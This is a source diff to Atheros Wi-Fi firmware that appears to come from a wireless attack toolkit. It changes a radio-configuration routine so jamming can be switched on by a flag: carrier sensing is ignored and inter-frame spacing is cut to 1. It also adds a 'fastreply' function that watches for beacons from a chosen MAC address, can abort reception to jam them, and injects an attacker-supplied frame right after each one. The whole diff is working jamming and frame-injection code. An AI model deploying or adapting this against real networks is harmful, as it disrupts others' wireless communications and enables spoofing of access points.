@@ -59,19 +59,22 @@ static inline unsigned int update_elapsed(unsigned int prev, unsigned int freq, 
  * Configure the radio for jammin purposes. Recommended to disable interrupts
  * before calling this function.
  */
-int attack_confradio(struct ath_softc_tgt *sc)
+int attack_confradio(struct ath_softc_tgt *sc, int jam)
 {
 	int q;
 
-	/* Ignore physical and virtual carrier sensing */
-	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW)
-		| AR_DIAG_FORCE_RX_CLEAR | AR_DIAG_IGNORE_VIRT_CS);
+	if (jam)
+	{
+		/* Ignore physical and virtual carrier sensing */
+		iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW)
+			| AR_DIAG_FORCE_RX_CLEAR | AR_DIAG_IGNORE_VIRT_CS);
+	}
 
 	/*  Set SIFS to small value - ath9k_hw_set_sifs_time */
-	iowrite32_mac(AR_D_GBL_IFS_SIFS, 1);
+	iowrite32_mac(AR_D_GBL_IFS_SIFS, jam ? 1 : 10);
 
 	/*  Set slot time to value - ath9k_hw_setslottime */
-	iowrite32_mac(AR_D_GBL_IFS_SLOT, 1);
+	iowrite32_mac(AR_D_GBL_IFS_SLOT, jam ? 1 : 10);
 
 	/*  Set EIFS to small value - ath9k_hw_set_eifs_timeout */
 	iowrite32_mac(AR_D_GBL_IFS_EIFS, 1);
@@ -304,7 +307,7 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	// Prepare for transmission of injected packet
 	//	
 
-	attack_confradio(sc);
+	attack_confradio(sc, 1);
 
 	// Change 3rd parameter to 1 to retransmit the dummy packet.
 	bf = attack_build_packet(sc, NULL, 24, 0, NULL);
@@ -436,6 +439,164 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	// free memory and return
 	attack_free_packet(sc, bf);
 	printk("<reactjam\n");
+
+	return 0;
+}
+
+
+/**
+ * Monitor the air for beacons from a specific MAC address. Immediately reply with
+ * the given packet in `bf` **AFTER** the real beacon was transmitted (jamming is risky).
+ *
+ * FIXME: Very large code overlap with attack_reactivejam
+ */
+int attack_fastreply(struct ath_softc_tgt *sc, struct ath_tx_buf *bf, unsigned char source[6], unsigned int msecs, int jam)
+{
+	static const int TXQUEUE = 0;
+	struct ath_hal *ah = sc->sc_ah;
+	struct ath_rx_desc *ds, *ds2, *ds3, *ds4;
+	struct ath_txq *txq;
+	volatile struct ar5416_desc_20 *txads, *rxads;
+	volatile unsigned char *buff;
+	unsigned int elapsed, freq, prev;
+
+	if (jam) printk("jam-");
+	printk("fastreply\n");
+
+	// disable (simulated) interrupts and configure radio
+	ah->ah_setInterrupts(sc->sc_ah, 0);
+
+	//
+	// Prepare for transmission of injected packet
+	//	
+
+	attack_confradio(sc, jam);
+
+	// add buffer to the Tx list, save ath_tx_desc of the buffer
+	txq = &sc->sc_txq[TXQUEUE];
+	ATH_TXQ_INSERT_TAIL(txq, bf, bf_list);
+	txq->axq_link = &bf->bf_lastds->ds_link;
+	txads = AR5416DESC_20(bf->bf_desc);
+
+	//
+	// Prepare circular Rx buffer list: ds -> ds2 -> ds3 -> ds -> ...
+	//
+
+	ds = asf_tailq_first(&sc->sc_rxdesc);
+	ds2 = asf_tailq_next(ds, ds_list);
+	ds3 = asf_tailq_next(ds2, ds_list);
+	ds4 = asf_tailq_next(ds3, ds_list);
+
+	ds3->ds_list.tqe_next = ds;
+	ds3->ds_link = (unsigned int)ds;
+
+	//
+	// Initialize Timer
+	//
+
+	// frequency in MHz
+#ifdef MAGPIE_MERLIN
+	// Note: OS_REG_READ uses WLAN_BASE_ADDRESS as base, hence we can't use it.
+	freq = *(unsigned int *)CPU_PLL_BASE_ADDRESS;
+	freq = (freq - 5) / 4;
+	if (freq == 0) return 1;
+#else
+	freq = 117;
+#endif
+
+	elapsed = 0;
+	prev = NOW();
+
+	//
+	// MONITOR THE BUFFERS
+	//
+
+	rxads = AR5416DESC_20(ds);
+	ah->ah_setRxDP(ah, (unsigned int)rxads);
+
+	// Enable Rx
+	iowrite32_mac(AR_CR, AR_CR_RXE);
+	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
+	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);
+
+	while (elapsed < msecs)
+	{
+		// fill in data that shouldn't occur in valid 802.11 frames
+		buff = (volatile unsigned char *)rxads->ds_data;
+		buff[15] = 0xF1;
+
+		// prepare to send jam packet
+		txads->ds_txstatus9 &= ~AR_TxDone;
+
+		// Wait until frame has been detected, exit if it takes too long
+		while (elapsed < msecs && buff[15] == 0xF1) {
+			prev = update_elapsed(prev, freq, &elapsed);
+		}
+
+		// Exit on timeout, otherwise we recieved something
+		if (elapsed >= msecs) break;
+
+		// jam beacons and probe responses from the bssid
+		if (A_MEMCMP(source, buff + 10, 6) == 0 && buff[0] == 0x80)
+		{
+			// Abort Rx (XXX this assures the injected frame is sent fast enough)
+			if (jam) {
+				*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;
+			}
+
+			// Immediately sent the packet after beacon is received
+			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(txq->axq_qnum))) = (a_uint32_t)txads;
+			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_Q_TXE)) = 1 << txq->axq_qnum;
+
+			// Re-enable Rx for once packet is transmitted
+			if (jam) {
+				iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);
+			}
+
+			// No need to wait until AR_TxDone is set in txads->ds_txstatus9, we simple wait
+			// until we receive the next frame.
+			printk("+");
+		} else {
+			printk("-");
+		}
+
+		// move to next buffer in the (circular) list
+		rxads = AR5416DESC_20(rxads->ds_link);
+
+		// update elapsed time
+		prev = update_elapsed(prev, freq, &elapsed);
+	}
+
+	printk("\n");
+
+	//
+	// Cleanup
+	//
+
+	// fix the linked list
+	ds3->ds_list.tqe_next = ds4;
+	ds3->ds_link = (unsigned int)ds4;
+
+	// Temporarily disable Rx
+	iowrite32_mac(AR_CR, AR_CR_RXD);
+	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) | AR_DIAG_RX_DIS);
+
+	// Clear "received flag" of all subsequent buffers
+	// ds = (struct ath_rx_desc *)ar5416GetRxDP(ah); --- XXX TODO is this correct?
+	rxads = (struct ar5416_desc_20 *)ar5416GetRxDP(ah);
+	while (rxads != NULL) {
+		rxads->ds_rxstatus8 &= ~AR_RxDone;
+		rxads = (struct ar5416_desc_20 *)rxads->ds_link;
+	}
+
+	// Enable Rx again
+	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
+	iowrite32_mac(AR_CR, AR_CR_RXE);
+
+	// re-enable interrupts
+	ah->ah_setInterrupts(sc->sc_ah, sc->sc_imask);
+
+	printk("<fastreply\n");
 
 	return 0;
 }
